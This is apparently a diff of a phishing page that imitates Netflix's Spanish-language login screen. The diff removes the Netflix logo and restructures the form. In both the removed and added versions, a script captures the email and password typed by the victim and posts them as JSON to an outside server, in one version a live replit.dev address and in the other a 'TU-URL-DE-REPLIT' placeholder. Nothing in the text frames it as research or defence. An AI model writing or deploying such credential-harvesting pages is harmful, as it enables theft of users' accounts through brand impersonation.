@@ -110,51 +110,44 @@
   </style>
 </head>
 
-<body> 
-      <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" 
-       alt="Netflix Logo"
-       style="width: 150px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto;">
+<form id="login-form" action="#" method="post" class="login-form"> 
+  <label for="username">Dirección de correo electrónico</label>
+  <input type="text" name="username" placeholder="Dirección de correo electrónico" class="login-input" required>
 
-  <form action="#" method="post" class="login-form"> 
+  <label for="password">Contraseña</label>
+  <input type="password" name="password" placeholder="Contraseña" class="login-input" required>
 
-    <label for="username">Dirección de correo electrónico</label>
-    <input type="text" name="username" placeholder="Dirección de correo electrónico" class="login-input" required>
+  <div class="extra-options">
+    <input type="checkbox" id="remember">
+    <label for="remember">Recordarme</label>
+    <p><a href="#">¿Has olvidado tu contraseña?</a></p>
+    <p>¿Primera vez en Netflix? <a href="#">Suscríbete ya.</a></p>
+  </div>
 
-    <label for="password">Contraseña</label>
-    <input type="password" name="password" placeholder="Contraseña" class="login-input" required>
+  <button type="submit" class="login-button">Iniciar sesión</button>
+</form>
 
-    <div class="extra-options">
-      <input type="checkbox" id="remember">
-      <label for="remember">Recordarme</label>
+<script>
+document.getElementById('login-form').addEventListener('submit', async function(e) {
+  e.preventDefault();
 
-      <p><a href="#">¿Has olvidado tu contraseña?</a></p>
-      <p>¿Primera vez en Netflix? <a href="#">Suscríbete ya.</a></p>
-    </div>
+  const email = e.target.username.value; 
+  const password = e.target.password.value;
 
-    <button type="submit" class="login-button">Iniciar sesión</button>
-  </form>
+  try {
+    const response = await fetch('https://TU-URL-DE-REPLIT/datos', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password })
+    });
 
-  <script>
-  document.getElementById('login-form').addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    const email = e.target.email.value;
-    const password = e.target.password.value;
-
-    try {
-      const response = await fetch('https://24fb22b1-ac17-4147-8b76-b84d03afe8c2-00-14r6zwjdn77nl.riker.replit.dev/datos', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password })
-      });
-
-      const data = await response.json();
-      console.log("Respuesta del servidor:", data);
-    } catch (error) {
-      console.error("Error al enviar datos:", error);
-    }
-  });
-
+    const data = await response.json();
+    console.log("Respuesta del servidor:", data);
+  } catch (error) {
+    console.error("Error al enviar datos:", error);
+  }
+});
 </script>
+
 </body>
 </html>
